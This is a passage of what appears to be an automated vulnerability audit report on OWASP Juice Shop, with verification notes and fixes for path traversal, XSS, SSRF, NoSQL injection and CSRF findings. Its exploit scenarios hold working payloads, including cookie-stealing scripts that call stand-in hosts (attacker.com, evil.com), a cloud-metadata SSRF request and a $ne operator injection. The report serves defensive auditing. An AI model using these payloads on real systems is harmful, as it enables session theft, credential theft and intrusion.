The `handleZipFileUpload` function extracts ZIP entries to `uploads/complaints/<fileName>` (line 39). It computes `absolutePath` via `path.resolve()` and attempts to validate it using `absolutePath.includes(path.resolve('.'))` on line 41. This `includes` check is fundamentally insecure: it only verifies that the resolved absolute path contains the current working directory as a substring, rather than enforcing a strict base-directory prefix. An attacker can supply `entry.path` values containing directory traversal sequences (e.g., `../`) that resolve outside `uploads/complaints/` but still contain the base directory string, or exploit OS/path-length edge cases. The validation passes, and `entry.pipe()` proceeds to write the file to the arbitrarily resolved target on line 42 without further restriction.

#### Impact
Allows writing arbitrary files to the server filesystem by bypassing the base directory validation. This can lead to overwriting application logic, cron jobs, or system configuration files, potentially escalating to remote code execution.

#### Exploit scenario
An attacker uploads a `.zip` file containing an entry named `../../app/server.js`. The `path.resolve()` call makes this `/app/server.js` (assuming `/app` is the cwd). The `includes('/app')` check passes. The `fs.createWriteStream` call overwrites `/app/server.js` with the attacker's payload, which executes upon the next service restart or module reload.

#### Preconditions
- Access to the file upload endpoint (typically unauthenticated or low-privilege user session)
- Ability to craft ZIP archive entries with `..` path segments

```
                const absolutePath = path.resolve('uploads/complaints/' + fileName)
                if (absolutePath.includes(path.resolve('.'))) {
                  entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName).on('error', function (err) { next(err) }))
                }
```

#### How to fix
Replace the `includes` check with a strict prefix validation: `if (absolutePath.startsWith(path.resolve('uploads/complaints') + path.sep))`. Additionally, strip or reject any `entry.path` that contains `..` or absolute path indicators before resolving.

**Exploitability:** CVSS 8.1 (AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N). Pre-auth path traversal in ZIP extraction; flawed `includes` check allows arbitrary filesystem writes.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — The path traversal flaw is real: `entry.path` from a crafted ZIP file flows unvalidated into `path.resolve('uploads/complaints/' + fileName)`, the `includes(path.resolve('.'))` check only ensures the resolved path contains the CWD string (not that it's a strict subdirectory), and the file is written to the attacker-controlled location. The gate `utils.isChallengeEnabled(challenges.fileWriteChallenge)` is a challenge-flag toggle, not input sanitization; `fileWriteChallenge` has `disabledEnv: [Docker, Heroku, Gitpod]` so it remains **enabled by default** in non-Docker/non-Heroku/non-Gitpod deployments with a public POST `/file-upload` endpoint. Confidence 8: I verified the full path from upload to write, confirmed the `includes()` flaw, and checked the challenge enablement logic.



### 9. [HIGH] Reflected XSS via unsafe `bypassSecurityTrustHtml` on search query
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `frontend/src/app/search-result/search-result.component.ts:156-163`
**CVSS 3.1:** **8.1** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The `SearchResultComponent` reads the `q` query parameter from the router snapshot on line 156. Instead of letting Angular's template engine handle escaping automatically line 163 casts the raw, unvalidated string to Angular's `SafeHtml` type using `bypassSecurityTrustHtml`. This unconditionally tells Angular that the input is safe. When `searchValue` is bound to the template (typically via `[innerHTML]`), Angular skips sanitization and writes the payload directly to the DOM, resulting in reflected XSS.

#### Impact
An attacker can execute arbitrary JavaScript in the victim's browser by injecting a payload into the `q` URL parameter. Angular's framework-level escaping is explicitly disabled, allowing the payload to render and execute.

#### Exploit scenario
An attacker crafts a URL like `https://juice-shop.com/#/search?q=<svg/onload=alert(document.cookie)>`. A victim visits the link, and the search results page immediately executes the injected script.

#### Preconditions
- Victim must click a crafted URL containing a malicious `q` parameter

```
    let queryParam: string = this.route.snapshot.queryParams.q
    if (queryParam) {
      queryParam = queryParam.trim()
      // ...
      this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)
```

#### How to fix
Remove the `bypassSecurityTrustHtml` call on line 163. Rely on Angular's default context-aware escaping for `searchValue`. If rich HTML output is strictly required, validate and sanitize the string with a trusted library like DOMPurify before assigning it.

**Exploitability:** CVSS 5.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N). Requires victim click (UI:R); reflected XSS via Angular `bypassSecurityTrustHtml` in search query.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Unsanitized user input (q query param) flows from router to bypassSecurityTrustHtml to [innerHTML] template binding, creating a reflected XSS vector with no upstream sanitization or CSP defense present.



### 10. [HIGH] Stored XSS via bypassed sanitizer on admin feedback view
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `frontend/src/app/administration/administration.component.ts:70-80`
**CVSS 3.1:** **8.1** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The `findAllFeedbacks` method retrieves comments from the backend and overrides Angular's DOM sanitizer using `bypassSecurityTrustHtml` on `feedback.comment`. This sanitized value is subsequently bound to `[innerHTML]` in the associated template. Since comments originate from user-controllable input, a stored XSS payload persists on the server and executes upon admin rendering. A secondary instance of this bypass exists in `about.component.ts` when populating the customer feedback gallery.

#### Impact
An attacker can store malicious HTML/JavaScript in a user-submitted feedback or review. When a sessioned administrator views the administration panel, the unsanitized payload executes, enabling session hijacking or admin privilege abuse.

#### Exploit scenario
1. Submit a feedback containing `<img src=x onerror='fetch("https://attacker.com?c="+document.cookie)'>`. 2. Log in as an admin and navigate to the administration panel's feedback table. 3. The payload executes within the table row, exfiltrating the admin's session token.

#### Preconditions
- Valid user account to submit feedback
- Access to the admin role/session

```
for (const feedback of this.feedbackDataSource) {
      feedback.comment = this.sanitizer.bypassSecurityTrustHtml(feedback.comment)
    }
```

#### How to fix
Remove `bypassSecurityTrustHtml()` calls for user data. Render feedback using standard `{{ feedback.comment }}` interpolation or explicitly sanitize with a trusted library like DOMPurify before binding to `[innerHTML]`.

**Exploitability:** CVSS 6.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N). Requires admin or feedback access; stored XSS via bypassed sanitizer in admin panel.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — explicit bypassSecurityTrustHtml on untrusted user input bound to [innerHTML] is a confirmed Stored XSS; no server-side sanitization observed.

Analysis confirms the finding is accurate. In `administration.component.ts` (line 75), the code takes `feedback.comment` directly from the API response and passes it through `bypassSecurityTrustHtml()`, which explicitly tells Angular's `DomSanitizer` to treat the string as safe HTML. The template (`administration.component.html`, line 57) then binds this value to `[innerHTML]`. Angular's default behavior escapes HTML to prevent XSS, but `bypassSecurityTrustHtml` defeats this escape.

Because the data source is user-submitted feedback (received via `feedbackService.find()`), an attacker who can submit comments can inject arbitrary JavaScript that executes immediately when an administrator loads the feedback table page. This is a classic Stored XSS. The same pattern is confirmed in `about.component.ts` (lines 113-118) for the public feedback gallery, widening the attack surface to unauthenticated visitors.

There is no visible upstream input validation or server-side sanitization in the provided code to neutralize the payload before it reaches the browser. The `bypassSecurityTrustHtml` call is a deliberate security bypass that is applied to data without a trust guarantee. This is a valid security vulnerability.

CVSS vector justification:
- **AV:N** - Exposed over the network (HTTP API).
- **AC:L** - No special conditions needed; standard comment submission triggers it.
- **PR:L** - Requires a valid user account to submit the initial malicious comment.
- **UI:N** - The malicious HTML executes automatically upon the admin's page load (via `[innerHTML]` binding on the table cell).
- **S:U** - The XSS runs in the admin's browser and impacts that same browser's context/session.
- **C:H, I:H** - Stealing admin session cookies grants full confidentiality and integrity compromises (session hijacking).
- **A:N** - Typically used for data theft/privilege escalation, not service disruption.

### 11. [HIGH] Unescaped config interpolation in HTML customization allows stored XSS
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `lib/startup/customizeApplication.ts:103-106`
**CVSS 3.1:** **8.7** (High) — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *PR:H - high-privilege auth required*
**Confidence:** 0.85 (1 run agreed)

#### Description
The `customizeCookieConsentBanner` function reads the `application.cookieConsent.message` configuration value and concatenates it directly into a string (`contentProperty`) meant to update an HTML attribute in `index.html`. This string is passed to the `replace` module, which performs a raw string replacement in the target file. Because the configuration value is used inside an HTML attribute value without any escaping or sanitization, an attacker can close the attribute using a double-quote character and inject malicious markup (e.g., `<img src=x onerror=alert(1)>`). While configuration is typically operator-controlled, shared CI parameters or deployment configs cross a trust boundary per the trust model; if an attacker can manipulate these shared configuration sources, they gain persistent frontend code execution.

#### Impact
An attacker who controls the `application.cookieConsent.message` configuration value can inject arbitrary HTML/JavaScript into `frontend/dist/frontend/index.html`. This payload is persisted in the static frontend bundle and executes in the context of all users visiting the application.

#### Exploit scenario
An attacker gains write access to the `application.cookieConsent.message` configuration parameter via a compromised CI pipeline or shared config repository. They set the value to `"><img src=x onerror=alert(1)>`. The next startup rebuilds `index.html` with the payload embedded in the cookie consent banner's HTML attributes. When any user loads the frontend, the injected script executes.

#### Preconditions
- Attacker has write access to shared deployment configuration or CI environment variables

```
  const contentProperty = '"content": { "message": "' + config.get<string>('application.cookieConsent.message') + '...',
  replace({
    regex: /"content": { "message": ".*", "dismiss": ".*", "link": ".*", "href": ".*" }/,
    replacement: contentProperty,
```

#### How to fix
Sanitize or escape dynamic configuration values before interpolating them into HTML templates. Apply `escape-html` or a DOMPurify allowlist on `application.cookieConsent.message` (and other dynamic config values like `application.name` on line 81) at line 103 to prevent breaking out of the attribute context.

**Exploitability:** CVSS 4.0 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N). Requires privileged config access; stored XSS vector exists but trust boundary limits exploitation to deployment operators.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Code confirms unescaped config concatenation into client-side script block; impact is full XSS for all users triggered by a compromised CI/CD config source.

Analysis of `lib/startup/customizeApplication.ts` confirms the scanner's claim.

1. **Vulnerability Confirmation**: On **line 103**, the code constructs a JSON string (`contentProperty`) by directly concatenating configuration values via `config.get<string>('application.cookieConsent.message')` (and related fields) into a JavaScript initializer that is injected into the frontend's `index.html` (line 107). There is **no URL encoding or HTML escaping** (e.g., `escapeHTML`, `sanitizeHtml`) applied to these values.
2. **Exploitability**: A configuration value containing `"><script>payload</script><a"` will break out of the JavaScript string/attribute literal, closing the tag and injecting arbitrary executable code into the page. When any user loads the application, this script executes in their browser (Stored XSS / Persistent XSS).
3. **Trust Boundary**: The input source is `application.cookieConsent.message` from the `config` library, which maps to environment variables or deployment configuration files. As noted in the **OUT OF SCOPE** guidelines, while this requires high-privilege access (CI/CD or server admin), inputs crossing a boundary from a **shared config repository** or **CI pipeline parameters** to the application runtime are treated as untrusted. An attacker with access to the CI/CD variables or a compromised `config/custom.json` in a shared repo can inject this payload.

This is a low-severity finding because the prerequisite (write access to deployment config) is a significant privilege, but it is a valid security impact because the resulting code execution reaches any visitor.

### 12. [HIGH] Incorrect MIME validation allows SVG-based stored XSS
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `routes/profileImageFileUpload.ts:21-48`
**CVSS 3.1:** **8.7** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The middleware retrieves the uploaded file buffer via `req.file.buffer` (line 15) and determines its type using `fileType.fromBuffer` (line 21). At line 27, it checks `if (uploadedFileType === null || !utils.startsWith(uploadedFileType.mime, 'image'))`. This validation logic only verifies that the MIME string starts with the prefix 'image' (e.g., 'image/png', 'image/svg+xml'). It completely lacks a strict extension allowlist or structural validation. Consequently, the application accepts `image/svg+xml` files, which are XML-based and can contain interactive content. The file is subsequently written to disk at line 40 and its relative path is persisted to the database at line 48, where it is served by the frontend without sanitization.

#### Impact
An authenticated attacker can upload a malicious SVG file that bypasses the application's type check and executes arbitrary JavaScript in the context of any victim who views the attacker's profile page.

#### Exploit scenario
An attacker crafts an SVG payload containing `<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>` and uploads it via the `/api/ProfileImage` endpoint. The app accepts it because its MIME is `image/svg+xml`. The payload is stored in the DB and served. When a victim loads the attacker's profile, the browser parses the SVG, executes the script, and exfiltrates the victim's session cookie.

#### Preconditions
- Authenticated session
- Access to the profile image upload API endpoint

```
    const uploadedFileType = await fileType.fromBuffer(buffer)
    if (uploadedFileType === undefined) {
      res.status(500)
      next(new Error('Illegal file type'))
      return
    }
    if (uploadedFileType === null || !utils.startsWith(uploadedFileType.mime, 'image')) {
      res.status(415)
      next(new Error(`Profile image upload does not accept this file type${uploadedFileType ? (': ' + uploadedFileType.mime) : '.'}`))
      return
    }
    ...
    const filePath = `frontend/dist/frontend/assets/public/images/uploads/${loggedInUser.data.id}.${uploadedFileType.ext}`
    try {
      await fs.writeFile(filePath, buffer)
    } catch (err) {
      logger.warn('Error writing file: ' + (err instanceof Error ? err.message : String(err)))
    }

    try {
      const user = await UserModel.findByPk(loggedInUser.data.id)
      if (user != null) {
        await user.update({ profileImage: `assets/public/images/uploads/${loggedInUser.data.id}.${uploadedFileType.ext}` })
      }
    } catch (error) {
      next(error)
    }
```

#### How to fix
Enforce a strict extension allowlist (e.g., `['png', 'jpg', 'jpeg', 'gif', 'webp']`) on `uploadedFileType.ext` at line 27, and/or implement an SVG sanitization library (like `@yao-png/svg-sanitizer` or `saxes`) to strip `script` and event handler attributes before persistence.

**Exploitability:** CVSS 6.1 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N). Authenticated SVG upload with weak MIME check; enables stored XSS but requires UI interaction for victim execution.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 10/10) — Scanner correctly identified SVG content stored to disk and rendered via img src without sanitization; SVG's <script> and event handlers are inherently executable in this context

Good. Now I have a complete picture of the application. Let me verify the exploitability step by step.

**Chain Verification:**

1. **Upload** (`routes/profileImageFileUpload.ts:27`): MIME validation is `utils.startsWith(uploadedFileType.mime, 'image')` — this allows `image/svg+xml`. No extension check. ✅ *Scanner's claim is correct.*

2. **Write** (lines 38-40): Buffer is written unconditionally to `frontend/dist/frontend/assets/public/images/uploads/{userId}.{ext}`. No sanitization of content. ✅

3. **Persist to DB** (line 48): Relative path `assets/public/images/uploads/{userId}.{ext}` is stored in the `profileImage` database column. ✅

4. **Route serving** (`server.ts:265`): `express.static('frontend/dist/frontend')` — `/assets/public/images/uploads/*` is served as static content. ✅

5. **Pug template rendering** (`routes/userProfile.ts:43`): `views/userProfile.pug` — `img.img-rounded(src=profileImage, ...)` — the stored path is used directly as the img src. ✅

6. **CSP** (`server.ts:85`): `img-src 'self' ${user?.profileImage}` — the CSP injects profileImage into `img-src`, which explicitly permits loading the SVG as an image. ✅

7. **Angular chatbot**: `chatbot.component.ts:79` — `this.profileImageSrc = user.profileImage` — Angular binds profileImage to an img src without sanitization. ✅

Now I'm confident in verifying whether SVG stored XSS is actually exploitable.

**Key question: Can an SVG in an img src execute code?**

Yes. SVG is an XML-based image format that supports:
- `<script>` elements which execute when the SVG is parsed
- Event handlers like `onload`, `onerror` on SVG elements and child elements

The SVG content is served with Content-Type determined by the Express static file server (based on file extension .svg → `image/svg+xml`), which means browsers will parse it as SVG and execute any embedded script/event-handler content.

**Are there any defenses?**

- No content sanitization at upload
- No extension whitelist (only MIME prefix)
- CSP explicitly allows the profileImage path in img-src
- File is served as raw static content
- The `accessControlChallenges()` middleware on line 217 is a challenge-tracking mechanism, not a security defense

This is a **TRUE_POSITIVE**. The scanner correctly identified that SVG is not being rejected and that the MIME check is the sole gate, allowing SVG's inherent scripting capabilities to bypass the "image-only" validation.

For CVSS: this is stored XSS where an authenticated attacker can craft malicious SVG payload that executes in a victim's browser when they view the attacker's profile. The impact includes session hijacking (cookie theft), content manipulation, and potential further XSS to other users (if any).

Confidence: 10/10 — I've verified every link in the chain from upload to exploitation, and the scanner's description accurately reflects the code.

### 13. [HIGH] Unvalidated URL fetch allows Server-Side Request Forgery
**Class:** CWE-918: Server-Side Request Forgery (SSRF)
**CWE:** CWE-918: Server-Side Request Forgery (SSRF) - https://cwe.mitre.org/data/definitions/918.html
**File:** `routes/profileImageUrlUpload.ts:15-35`
**CVSS 3.1:** _not computed_
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *internal-network position required*
**Confidence:** 0.95 (1 run agreed)

#### Description
The handler reads `req.body.imageUrl` without validation and passes it directly to `fetch(url)` on line 21. No scheme, host, or redirect restrictions are applied. This allows an attacker to force the backend server to make requests to internal networks or sensitive cloud metadata services. Additionally, if the fetch fails, the raw `url` is persisted to the user model on line 33, which can be rendered unsanitized by the frontend.

#### Impact
Authenticated attackers can supply arbitrary URLs, causing the server to fetch internal or cloud metadata endpoints, potentially exposing sensitive infrastructure data. The unsanitized URL is also stored in the database on failure, risking stored XSS or open redirect attacks when rendered in the frontend.

#### Exploit scenario
An authenticated user sends a POST request with `{"imageUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`. The server fetches the URL, returning IAM credentials to the attacker, which can then be used to access AWS resources.

#### Preconditions
- Authenticated session with valid cookie token
- Ability to send POST requests to the profile upload endpoint

```
      const url = req.body.imageUrl
      // ... (challenge hook omitted)
      if (loggedInUser) {
        try {
          const response = await fetch(url)
```

#### How to fix
Validate the `imageUrl` against a strict allow-list of trusted hostnames and enforce the `https:` scheme. Parse the URL to verify `urlObj.hostname` matches expected values before calling `fetch`. Implement a network egress controller or proxy to restrict outbound connections to authorized services only.

**Exploitability:** CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N). Pre-auth SSRF; unvalidated `fetch()` forces server to internal networks/metadata without auth.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 10/10) — Direct, unvalidated user-controlled URL passed to fetch() server-side with no network allow-list or private IP blocklist.

The file `routes/profileImageUrlUpload.ts` is part of the OWASP Juice Shop application. The code directly assigns the user-supplied `req.body.imageUrl` to `const url` and passes it directly to the global `fetch()` function on line 21 without performing any scheme, hostname, or IP address validation. 

Because the fetch is performed server-side, an authenticated user can supply a URL pointing to private/internal network addresses (e.g., `http://169.254.169.254/...`) or cloud metadata endpoints. The server will make the request and return the response body to the user's browser. There is no allow-list, no proxy middleware, and no blocklist for link-local or RFC-1918 addresses in this route or its upstream chain (`server.ts` line 285). 

Additionally, the secondary claim in the description is also valid: if the fetch fails (or succeeds with unexpected content), the raw, attacker-controlled `url` is persisted to the database on line 33 (`await user?.update({ profileImage: url })`), which can be rendered unsanitized in the frontend.

This is a textbook, exploitable Server-Side Request Forgery (SSRF). It is a TRUE_POSITIVE.

### 14. [HIGH] Stored XSS via unescaped innerHTML on feedback content
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `frontend/src/app/feedback-details/feedback-details.component.html:15-15`
**CVSS 3.1:** **8.1** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The application collects user input through contact forms and product reviews (contact.component.ts:82, product-details.component.ts:70) and stores it server-side without HTML escaping. When this content is later retrieved and rendered in the product dialog, the template binds it using Angular's [innerHTML] directive (feedback-details.component.html:15, product-details.component.html:13). The [innerHTML] binding explicitly bypasses Angular's built-in DOMPurify sanitizer, injecting raw untrusted HTML directly into the DOM. Since the server does not neutralize special characters before storage, malicious scripts execute in the viewer's context. A second related sink exists in product-details.component.ts which also renders user-controlled descriptions via [innerHTML].

#### Impact
Attacker-supplied HTML/JavaScript in user reviews is rendered without sanitization, enabling session hijacking, account takeover, or defacement. This directly compromises user session integrity and data confidentiality.

#### Exploit scenario
An attacker submits a feedback comment containing <script>fetch('https://evil.com/steal?c='+document.cookie)</script>. When an administrator or victim views the product review modal, the script executes immediately, sending the victim's authentication token to the attacker's server for session hijacking.

#### Preconditions
- Attacker has authenticated credentials to submit feedback/reviews
- Victim triggers the modal view containing the malicious content

```
<cite [innerHTML]="feedback"></cite>
```

#### How to fix
Remove the [innerHTML] binding and use Angular's standard text interpolation {{ }} which auto-escapes content. If HTML rendering is strictly required for legitimate formatting, enforce strict server-side HTML sanitization (e.g., DOMPurify) and bind via DomSanitizer.bypassSecurityTrustHtml with a context-aware allowlist.

**Exploitability:** CVSS 6.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N). Authenticated stored XSS in feedback; bypasses Angular sanitizer but scoped to content viewers.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Full data flow confirmed: user input → server storage (no escaping) → Angular bypassSecurityTrustHtml (marks safe) → [innerHTML] injection. XSS executes on admin page load.

Now I have the complete picture. Let me analyze the findings:

**Analysis**

**Finding 1: `feedback-details.component.html:15` — `[innerHTML]="feedback"`**

**Data flow:**
1. `FeedbackService.find()` fetches feedback from the server API
2. `AdministrationComponent.findAllFeedbacks()` iterates results and calls `this.sanitizer.bypassSecurityTrustHtml(feedback.comment)` on line 75
3. `showFeedbackDetails()` (line 108) opens `FeedbackDetailsComponent` dialog with `data.feedback = feedback.comment`
4. `FeedbackDetailsComponent.ngOnInit()` sets `this.feedback = this.dialogData.feedback`
5. Template renders with `[innerHTML]="feedback"`

**The sanitizer claim:** `DomSanitizer.bypassSecurityTrustHtml()` does **NOT** sanitize/escape input. It only marks content as "trusted" so Angular's auto-sanitizer skips escaping. This is by design in Angular — the developer is asserting the content is safe. Here, the developer is asserting that the server already sent safe HTML, but the server does not sanitize user input.

**Defense check:** There is NO defense in the chain:
- Server does not HTML-escape before storage
- `bypassSecurityTrustHtml` deliberately skips sanitization
- `[innerHTML]` injects raw HTML directly into DOM

**Exploitability:** The table in `administration.component.html:57` also renders `[innerHTML]="feedback.comment"` directly in the table cells — so the XSS can execute just by the admin navigating to the administration page, **not** just when clicking the detail dialog. **UI: N is accurate**.

**Finding 2: `product-details.component.ts/html` — Product Description XSS**

`product-details.component.html:13` renders `data.productData.description` via `[innerHTML]`. This is product catalog data fetched from the database, not user-submitted feedback. While it could be a vector if product descriptions are user-editable, the scanner conflated review input with product data. For now, I'll focus on the confirmed vulnerability.

**Finding 3: `product-details.component.html:52-53` — Review Display**

Reviews are rendered via `{{review.message}}` (interpolation), which Angular auto-escapes. The scanner's claim about `[innerHTML]` for reviews here was **incorrect**. However, the table in `search-result` and `score-board` components also use `bypassSecurityTrustHtml` + `[innerHTML]` patterns on user data.

**Conclusion**

The reported XSS in `feedback-details.component.html:15` is **genuine** and exploitable. User-submitted HTML is stored server-side without escaping, passed through `bypassSecurityTrustHtml()` (which doesn't sanitize—it's explicitly a trust marker), and rendered unsanitized via `[innerHTML]`. The impact in `administration.component.html` makes it even worse (UI:N since table cells render on page load).

### 15. [HIGH] Missing authorization and unsanitized MongoDB filter injection
**Class:** CWE-943
**CWE:** CWE-943 - https://cwe.mitre.org/data/definitions/943.html
**File:** `routes/updateProductReviews.ts:13-16`
**CVSS 3.1:** **8.1** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The `updateProductReviews` endpoint extracts `req.body.id` and `req.body.message` directly from the HTTP request and passes them into the MongoDB update operation without validating document ownership or sanitizing the input. The filter `{ _id: req.body.id }` is constructed using raw user input, allowing an attacker to inject MongoDB query operators (e.g., `{ $ne: null }`) that bypass the `_id` equality constraint. Combined with the hardcoded `multi: true` option, operator injection can match and update multiple or all documents in the collection. Although `security.authenticatedUsers.from(req)` retrieves the current user, the principal is never bound to the query, leaving the update operation entirely unscoped and exposed to direct object reference exploitation.

#### Impact
Authenticated users can modify or overwrite arbitrary product reviews by supplying any review ID or NoSQL operators in the request payload. This breaks the intended ownership model, compromises data integrity across all reviews if operators are used, and completely bypasses application-level access controls.

#### Exploit scenario
An attacker sends a POST request with `id: {'$ne': null}` and `message: 'compromised'`. The MongoDB driver evaluates the filter as `{ _id: { $ne: null } }`, which matches every review document. The database applies the `$set` operation across all matched records, overwriting their `message` fields without triggering any authorization failure or validation error.

#### Preconditions
- Valid authenticated session (or session reuse/cookie theft)
- HTTP POST access to the review update endpoint

```
      db.reviewsCollection.update(
        { _id: req.body.id },
        { $set: { message: req.body.message } },
        { multi: true }
      )
```

#### How to fix
Enforce strict ownership validation before invoking the database; replace the direct filter assignment with a safe query that binds the authenticated user ID alongside the target ID: `{ _id: req.body.id, author: user.data.email }`. Remove the hardcoded `multi: true` option and validate `result.modified === 1` before returning success.

**Exploitability:** CVSS 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N). Authenticated MongoDB operator injection; `multi: true` combined with raw filter enables bulk document compromise.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Scanner correctly identified unsanitized MongoDB filter and missing authorization in the production route; authenticated users can update any/reviews via NoSQL operator injection

I've now confirmed the full picture. Let me provide my analysis.

**Analysis**

**What the code actually does**
The route at `/rest/products/reviews` (PATCH) in `server.ts:589` is:
```
app.patch('/rest/products/reviews', security.isAuthorized(), updateProductReviews())
```

The `updateProductReviews` handler in `routes/updateProductReviews.ts:13-16`:
```typescript
db.reviewsCollection.update(
  { _id: req.body.id },
  { $set: { message: req.body.message } },
  { multi: true }
)
```

The user fetched via `security.authenticatedUsers.from(req)` is only used for `challengeUtils.solveIf()` checks on lines 19-20 — **never bound to the MongoDB query**. The update filter uses `req.body.id` directly as the value for `_id`.

**Defenses present**
1. **`security.isAuthorized()`** — wraps the route in `express-jwt` middleware (line 589). This requires a valid JWT token. Confirmed at `lib/insecurity.ts:48`.
2. **No other input validation** — there is no type check on `req.body.id`, no allow-list, no escaping. The user is authenticated but not authorized as "owner" of the specific review.

**Can the exploit work?**
YES. An authenticated attacker sends:
```json
PATCH /rest/products/reviews { "id": { "$ne": null }, "message": "XSS payload" }
```
The MongoDB driver evaluates `{ _id: { $ne: null } }` as a query operator expression matching **every** document (since every doc has an `_id`), and `multi: true` applies the `$set` across all matched records.

This is the exact `noSqlReviewsChallenge` in Juice Shop (confirmed in `data/static/challenges.yml:812`). The scanner correctly identified the real code defect that enables this challenge.

**Is this a false positive?**
The fact that this is Juice Shop (a deliberately vulnerable training app) does **not** make the finding a FP. The scanner correctly identified:
1. **NoSQL injection** — `req.body.id` passed directly into MongoDB filter without validation
2. **Missing authorization** — the authenticated user is never used to scope the query; any user can modify any (or all) reviews

Both are real, exploitable vulnerabilities in the source code. The "authentication" defense only gates who can reach the route, not authorization of which records can be modified.

**VERDICT**

CONFIDENCE: 9/10
- Actively verified the route registration (`security.isAuthorized()` at `PATCH /rest/products/reviews`)
- Confirmed `req.body.id` enters the MongoDB filter unvalidated
- Confirmed the authenticated user principal is never bound to the query
- No input validation or sanitization exists for the filter value
- The only mitigation (JWT auth) is an authentication gate, not an authorization control on the affected resource — doesn't close the path
- The scanner's claim about `multi: true` and operator injection is correct in the code

The application name ("juice-shop", "Probably the most modern and sophisticated insecure web app") confirms it as OWASP Juice Shop, a CTF/training app where this vulnerability is intentionally present as the `noSqlReviewsChallenge`. But this is still a real code-level security vulnerability that the scanner correctly identified.

### 16. [HIGH] Unscoped state-changing form lacking CSRF protection
**Class:** CWE-352: Cross-Site Request Forgery (CSRF)
**CWE:** CWE-352: Cross-Site Request Forgery (CSRF) - https://cwe.mitre.org/data/definitions/352.html
**File:** `views/dataErasureForm.hbs:18-33`
**CVSS 3.1:** **8.1** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
Entry point: POST /dataerasure route triggered by the Web UI form in this template (line 18). Authenticates as: Active browser session cookie (or anonymous submission if unauthenticated mode is enabled). Resource: Target user account and associated PII. WHERE ownership/tenant/role is verified: Expected server-side on the /dataerasure handler, but this view completely lacks a CSRF token or anti-forgery state binding to the originating session. Without this token, the server cannot cryptographically verify that the request originated from the user's own trusted context, effectively bypassing the cross-origin authorization layer. Furthermore, the 'email' input (line 21) accepts arbitrary, attacker-controlled values rather than being scoped to the current session's identity. This allows a malicious actor to target any user's account provided they know the associated security answer, creating an unscoped deletion vector. The absence of a CSRF token on this form is a direct authorization check omission that breaks the implicit trust contract between the session cookie and the state-changing request.

